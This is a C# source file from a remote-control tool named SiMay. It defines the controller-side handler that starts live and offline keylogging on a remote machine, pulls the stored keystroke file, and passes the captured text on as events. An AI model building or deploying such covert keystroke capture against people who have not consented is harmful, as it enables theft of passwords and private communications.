using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SiMay.Core;
using SiMay.Core.Extensions;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Net.SessionProvider.SessionBased;

namespace SiMay.RemoteControlsCore.HandlerAdapters
{
    public class KeyboardAdapterHandler : AdapterHandlerBase
    {
        public event Action<KeyboardAdapterHandler, string> OnKeyboardDataEventHandler;

        public event Action<KeyboardAdapterHandler, string> OnOffLineKeyboradEventHandler;

        [PacketHandler(MessageHead.C_KEYBOARD_DATA)]
        private void KeyBoardDataHandler(SessionHandler session)
        {
            var text = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            this.OnKeyboardDataEventHandler?.Invoke(this, text);
        }

        [PacketHandler(MessageHead.C_KEYBOARD_OFFLINEFILE)]
        private void OffLinesDataHandler(SessionHandler session)
        {
            var text = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            this.OnOffLineKeyboradEventHandler?.Invoke(this, text);
        }

        public void StartGetKeyorad()
        {
            SendAsyncMessage(MessageHead.S_KEYBOARD_ONOPEN);
        }

        public void StartOffLineKeyboard()
        {
            SendAsyncMessage(MessageHead.S_KEYBOARD_OFFLINE);
        }

        public void GetOffLineKeyboardData()
        {
            SendAsyncMessage(MessageHead.S_KEYBOARD_GET_OFFLINEFILE);
        }
    }
}
